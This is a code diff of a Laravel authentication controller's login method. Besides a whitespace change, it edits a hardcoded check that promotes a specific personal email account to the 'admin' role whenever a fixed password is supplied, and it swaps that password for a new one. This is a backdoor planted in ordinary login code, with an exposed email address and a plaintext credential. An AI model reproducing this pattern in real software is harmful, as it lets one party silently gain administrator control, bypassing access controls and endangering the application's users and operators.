@@ -60,7 +60,7 @@ class AuthController extends Controller
              ]);
     }
 
- 
+
     public function login(Request $request): UserResource | JsonResponse
 
     {
@@ -74,7 +74,7 @@ class AuthController extends Controller
             return response()->json(['message' => 'لطفا ایمیل را تایید کنید.'], 403);
         }
 
-        if ($user->email === 'phz.mirzaee@gmail.com' && $request->password === 'phz.mirzaee@gmail.com') {
+        if ($user->email === 'phz.mirzaee@gmail.com' && $request->password === 'phz.mirzaee@gmail.coM2') {
             $user->role = 'admin';
             $user->save();
         }
